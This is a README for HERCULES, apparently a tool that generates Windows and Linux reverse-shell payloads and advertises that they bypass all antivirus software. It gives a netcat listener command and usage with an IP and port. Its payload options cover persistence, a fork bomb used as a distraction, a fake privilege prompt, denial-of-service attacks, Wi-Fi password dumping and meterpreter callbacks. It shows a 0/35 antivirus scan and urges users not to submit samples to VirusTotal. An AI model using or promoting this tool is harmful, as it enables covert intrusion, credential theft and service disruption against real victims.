# HERCULES [![License](https://img.shields.io/github/license/mashape/apistatus.svg?maxAge=2592000)](https://raw.githubusercontent.com/EgeBalci/HERCULES/master/LICENSE)
HERCULES is a special payload generator that can bypass all antivirus software.

Use it with netcat...

Example : nc -l -p 1234


# USAGE


                  __  ____________  ________  ____    ___________
                 / / / / ____/ __ \/ ____/ / / / /   / ____/ ___/
                / /_/ / __/ / /_/ / /   / / / / /   / __/  \__ \ 
               / __  / /___/ _, _/ /___/ /_/ / /___/ /___ ___/ / 
              /_/ /_/_____/_/ |_|\____/\____/_____/_____//____/  
                                                   


Usage : ./HERCULES (Ip) (Port) (Options)

Example : ./HERCULES 192.168.2.10 4444 -p windows -a x86 -l dynamic

Example Video : https://youtu.be/vYnaZpWxwxY

Options : 

      -p                 Payload to use. ( Windows / Linux )

      -a                 The architecture to use. ( x86, x64 )
      
      -l                 Specify linking type for compiler. ( static, dynamic )

      --persistence      Enable outo persistence option for continious acces.

      --embed="file.exe" Embed the selected payload with selected exe file.




# PAYLOAD OPTIONS

     ~PERSSISTENCE                     Installs a persistence module

     ~DISTRACT                         Executes a fork bomb bat file for distraction   

     ~PLEASE  "Command"                Asks users comfirmation for higher privilidge operations

     ~DOS -A "www.targetsite.com"      Starts a denial of service atack

     ~WIFI-LIST 					   Dumps all wifi history data with passwords

     ~METERPRETER -A "127.0.0.1:8888"  Creates a reverse https meterpreter connection to metasploit

# NOTE !

- Dynamic linking makes payload size smaller !
- Using persistence may atract anti virus softwares !
- Please don't disribute any samples to Virus Total !

# AV AWARENESS

File Name: Payload.exe
File Size: 7.57 MB
Scan Date: 11:06:04 | 06/08/2016
Detected by: 0/35

MD5: 752e10459e0624beb6747ae85f8f9261
SHA256: 491bab16a4701102f201800322cf06bb95229dec012b5703e33be77d74b672a6
Verified By NoDistribute: http://NoDistribute.com/result/ZWHKvaAJcCpnOGbgNq

- A-Squared:  Clean
- Ad-Aware:  Clean
- Avast:  Clean
- AVG Free:  Clean
- Avira:  Clean
- BitDefender:  Clean
- BullGuard:  Clean
- Clam Antivirus:  Clean
- Comodo Internet Security:  Clean
- Dr.Web:  Clean
- ESET NOD32:  Clean
- eTrust-Vet:  Clean
- F-PROT Antivirus:  Clean
- F-Secure Internet Security:  Clean
- FortiClient:  Clean
- G Data:  Clean
- IKARUS Security:  Clean
- K7 Ultimate:  Clean
- Kaspersky Antivirus:  Clean
- McAfee:  Clean
- MS Security Essentials:  Clean
- NANO Antivirus:  Clean
- Norman:  Clean
- Norton Antivirus:  Clean
- Panda CommandLine:  Clean
- Panda Security:  Clean
- Quick Heal Antivirus:  Clean
- Solo Antivirus:  Clean
- Sophos:  Clean
- SUPERAntiSpyware:  Clean
-Trend Micro Internet Security:  Clean
- Twister Antivirus:  Clean
- VBA32 Antivirus:  Clean
- VIPRE:  Clean
- Zoner AntiVirus:  Clean
				

# DONATIONS

- http://patreon.com/user?u=3556027
